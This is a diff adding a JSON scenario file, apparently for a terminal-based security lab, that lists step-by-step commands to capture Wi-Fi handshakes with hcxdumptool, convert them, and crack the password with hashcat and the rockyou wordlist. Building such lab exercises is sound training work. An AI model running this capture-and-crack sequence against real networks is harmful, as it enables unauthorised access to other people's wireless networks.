@@ -1,0 +1,95 @@
+{
+    "terminals": [
+        {
+            "name": "main",
+            "phases": [
+                {
+                    "name": "0",
+                    "commands": [
+                        {
+                            "input": "iwconfig",
+                            "outputType": "inline",
+                            "output": "Output of command:\r\nlo\t\tno wireless extensions.\r\neth0\t\tno wireless extensions.",
+                            "outputFile": "",
+                            "required": "true",
+                            "final": "true"
+                        }
+                    ]
+                },
+                {
+                    "name": "1",
+                    "action": {
+                        "description": "Plug wifi dongle",
+                        "required": "true",
+                        "final": "true"
+                    }
+                },
+                {
+                    "name": "2",
+                    "commands": [
+                        {
+                            "input": "iwconfig",
+                            "outputType": "file",
+                            "output": "",
+                            "outputFile": "iwconfig_dongle_out.txt",
+                            "required": "true",
+                            "final": "true"
+                        }
+                    ]
+                },
+                {
+                    "name": "3",
+                    "commands": [
+                        {
+                            "input": "hcxdumptool -i wlan0 -o dumpfile.pcapng --active_beacon",
+                            "outputType": "file",
+                            "output": "",
+                            "outputFile": "hcxdumptool_out_1.txt",
+                            "required": "true",
+                            "final": "true"
+                        }
+                    ]
+                },
+                {
+                    "name": "4",
+                    "commands": [
+                        {
+                            "input": "hcxpcapngtool -o hash.hc22000 dumpfile.pcapng",
+                            "outputType": "file",
+                            "output": "",
+                            "outputFile": "hcxdumptool_out_2.txt",
+                            "required": "true",
+                            "final": "true"
+                        }
+                    ]
+                },
+                {
+                    "name": "5",
+                    "commands": [
+                        {
+                            "input": "hashcat -m 22000 hash.hc22000 rockyou.txt",
+                            "outputType": "file",
+                            "output": "",
+                            "outputFile": "hashcat_out_1.txt",
+                            "required": "true",
+                            "final": "true"
+                        }
+                    ]
+                },
+                {
+                    "name": "6",
+                    "commands": [
+                        {
+                            "input": "hashcat hash.hc22000 --show",
+                            "outputType": "file",
+                            "output": "",
+                            "outputFile": "hashcat_out_2.txt",
+                            "required": "true",
+                            "final": "true"
+                        }
+                    ]
+                }
+            ]
+        }
+    ]
+}
